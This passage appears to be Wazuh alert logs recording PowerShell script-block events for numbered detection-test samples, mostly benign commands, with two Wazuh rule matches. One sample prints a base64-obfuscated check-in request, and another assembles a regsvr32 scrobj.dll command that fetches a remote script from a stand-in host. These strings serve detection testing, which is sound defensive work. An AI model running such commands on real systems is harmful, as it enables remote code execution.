{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"5e7d0f77-54b4-483e-9758-c324a54b8fc7","scriptBlockText":"$sampleId='PST-091'; Get-Culture | Select-Object Name, DisplayName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722009","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-091'; Get-Culture | Select-Object Name, DisplayName; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 5e7d0f77-54b4-483e-9758-c324a54b8fc7\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:06.6882877Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:06.6882877Z\",\"eventRecordID\":\"722009\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-091'; Get-Culture | Select-Object Name, DisplayName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 5e7d0f77-54b4-483e-9758-c324a54b8fc7\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-091'; Get-Culture | Select-Object Name, DisplayName; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"5e7d0f77-54b4-483e-9758-c324a54b8fc7\"}}}","id":"1784280967.452568","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:07.392+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"15f109ec-c999-4f5c-98b0-012c6c83f87d","scriptBlockText":"$sampleId='PST-092'; $url = 'http://localhost:8080/healthz?component=agent&amp;format=text'; Write-Output $url; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722016","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-092'; $url = 'http://localhost:8080/healthz?component=agent&format=text'; Write-Output $url; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 15f109ec-c999-4f5c-98b0-012c6c83f87d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:07.0327624Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:07.0327624Z\",\"eventRecordID\":\"722016\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-092'; $url = 'http://localhost:8080/healthz?component=agent&format=text'; Write-Output $url; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 15f109ec-c999-4f5c-98b0-012c6c83f87d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-092'; $url = 'http://localhost:8080/healthz?component=agent&amp;format=text'; Write-Output $url; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"15f109ec-c999-4f5c-98b0-012c6c83f87d\"}}}","id":"1784280967.452568","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:07.411+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"daed9f8a-50d8-45d2-a516-3d8f1154222c","scriptBlockText":"$sampleId='PST-093'; Get-NetAdapter | Select-Object -First 5 Name, Status, MacAddress; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722020","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-093'; Get-NetAdapter | Select-Object -First 5 Name, Status, MacAddress; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: daed9f8a-50d8-45d2-a516-3d8f1154222c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:07.3520979Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:07.3520979Z\",\"eventRecordID\":\"722020\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-093'; Get-NetAdapter | Select-Object -First 5 Name, Status, MacAddress; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: daed9f8a-50d8-45d2-a516-3d8f1154222c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-093'; Get-NetAdapter | Select-Object -First 5 Name, Status, MacAddress; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"daed9f8a-50d8-45d2-a516-3d8f1154222c\"}}}","id":"1784280968.452568","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:08.366+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a58bf74f-7320-4d45-8ec1-7334bbeff2b5","scriptBlockText":"$sampleId='PST-094'; $encoded='SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722126","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-094'; $encoded='SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a58bf74f-7320-4d45-8ec1-7334bbeff2b5\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:10.0560325Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:10.0560325Z\",\"eventRecordID\":\"722126\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-094'; $encoded='SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a58bf74f-7320-4d45-8ec1-7334bbeff2b5\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-094'; $encoded='SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a58bf74f-7320-4d45-8ec1-7334bbeff2b5\"}}}","id":"1784280970.454828","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":9,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:10.515+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"75b5eb4f-9592-4991-823d-eb4ae600ebe8","scriptBlockText":"$sampleId='PST-095'; $json = '{\\\"server\\\":\\\"srv-file-01\\\",\\\"mode\\\":\\\"audit\\\",\\\"enabled\\\":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722140","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-095'; $json = '{\"server\":\"srv-file-01\",\"mode\":\"audit\",\"enabled\":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 75b5eb4f-9592-4991-823d-eb4ae600ebe8\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:10.3940794Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:10.3940794Z\",\"eventRecordID\":\"722140\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-095'; $json = '{\\\"server\\\":\\\"srv-file-01\\\",\\\"mode\\\":\\\"audit\\\",\\\"enabled\\\":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 75b5eb4f-9592-4991-823d-eb4ae600ebe8\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-095'; $json = '{\\\\\\\"server\\\\\\\":\\\\\\\"srv-file-01\\\\\\\",\\\\\\\"mode\\\\\\\":\\\\\\\"audit\\\\\\\",\\\\\\\"enabled\\\\\\\":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"75b5eb4f-9592-4991-823d-eb4ae600ebe8\"}}}","id":"1784280970.454828","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:10.619+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8fdaed40-a571-4fca-a952-ce0a53b89746","scriptBlockText":"$sampleId='PST-096'; 'alpha','beta','gamma' | ForEach-Object { Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($_))) } | Select-Object -First 2 Algorithm, Hash; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722144","keywords":"0x0","level":"3","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-096'; 'alpha','beta','gamma' | ForEach-Object { Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($_))) } | Select-Object -First 2 Algorithm, Hash; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8fdaed40-a571-4fca-a952-ce0a53b89746\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"WARNING","systemTime":"2026-07-17T09:36:10.7268127Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"3\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:10.7268127Z\",\"eventRecordID\":\"722144\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"WARNING\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-096'; 'alpha','beta','gamma' | ForEach-Object { Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($_))) } | Select-Object -First 2 Algorithm, Hash; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8fdaed40-a571-4fca-a952-ce0a53b89746\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-096'; 'alpha','beta','gamma' | ForEach-Object { Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($_))) } | Select-Object -First 2 Algorithm, Hash; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8fdaed40-a571-4fca-a952-ce0a53b89746\"}}}","id":"1784280971.454828","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:11.566+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"353cea9d-cd1e-420e-b85e-bbaba2ce6ae1","scriptBlockText":"$sampleId='PST-097'; 'routine maintenance script' | Measure-Object -Character; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722149","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-097'; 'routine maintenance script' | Measure-Object -Character; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 353cea9d-cd1e-420e-b85e-bbaba2ce6ae1\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:11.0870914Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:11.0870914Z\",\"eventRecordID\":\"722149\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-097'; 'routine maintenance script' | Measure-Object -Character; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 353cea9d-cd1e-420e-b85e-bbaba2ce6ae1\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-097'; 'routine maintenance script' | Measure-Object -Character; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"353cea9d-cd1e-420e-b85e-bbaba2ce6ae1\"}}}","id":"1784280971.454828","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:11.577+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"008ab309-01a8-4b29-8c09-7caee40d04c2","scriptBlockText":"$sampleId='PST-098'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722152","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-098'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 008ab309-01a8-4b29-8c09-7caee40d04c2\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:11.4150164Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:11.4150164Z\",\"eventRecordID\":\"722152\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-098'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 008ab309-01a8-4b29-8c09-7caee40d04c2\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-098'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"008ab309-01a8-4b29-8c09-7caee40d04c2\"}}}","id":"1784280971.458563","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":13,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:11.586+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"9a5cbedc-706e-425d-ad72-3189b455bcba","scriptBlockText":"$sampleId='PST-099'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722166","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-099'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 9a5cbedc-706e-425d-ad72-3189b455bcba\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:11.7736131Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:11.7736131Z\",\"eventRecordID\":\"722166\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-099'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 9a5cbedc-706e-425d-ad72-3189b455bcba\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-099'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"9a5cbedc-706e-425d-ad72-3189b455bcba\"}}}","id":"1784280972.458563","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:12.653+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"ca5ee854-25d8-4f83-816e-e12bcc4a3be5","scriptBlockText":"$sampleId='PST-100'; $indicator='regsvr32.e' + 'xe /s' + ' /n /u /i:' + 'https://re' + 'g.exam' + 'ple.in' + 'valid/a.' + 'sct s' + 'crobj.' + 'dll'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722167","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-100'; $indicator='regsvr32.e' + 'xe /s' + ' /n /u /i:' + 'https://re' + 'g.exam' + 'ple.in' + 'valid/a.' + 'sct s' + 'crobj.' + 'dll'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: ca5ee854-25d8-4f83-816e-e12bcc4a3be5\r\nPath: 